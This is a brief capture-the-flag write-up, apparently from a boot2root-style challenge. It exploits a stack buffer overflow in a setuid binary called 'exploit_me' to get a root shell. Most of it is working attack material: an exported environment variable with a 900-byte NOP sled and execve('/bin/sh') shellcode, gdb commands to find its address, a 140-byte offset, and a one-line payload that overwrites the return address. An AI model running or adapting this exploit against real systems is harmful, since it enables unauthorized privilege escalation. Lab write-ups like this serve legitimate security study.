BONUS 4 - Alternative zaz disass. 

Repeat Steps 1- of writeup1.

Use Shellcode.

Inject environment variable, for using later, so we can more easy to use buffer overflow. 


export SHELLCODE=`python -c 'print "\x90" * 900 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
In SHELLCODE has 900 of \x90, it is «nop» - "Landing zone"

Find adress of variable «SHELLCODE»:

	gdb exploit_me
	(gdb) b *main
	(gdb) r
	(gdb) x/s *((char **)environ+0)
		Output:
			0xbffff56f
It is the last environmental variable - SHELLCODE. 


Chose the address: 0xbffff73f (Bytecode: \x3f\xf7\xff\xbf)
Which is in the midle.

Offset is 140.

Start binary with script as argument:
	./exploit_me $(python -c 'print "i"*140 + "\x3f\xf7\xff\xbf"')

Check it:      
	whoami                                                                                                                                     
		Output:
			root

WOW! It is 'root'!                                                                                                                                               
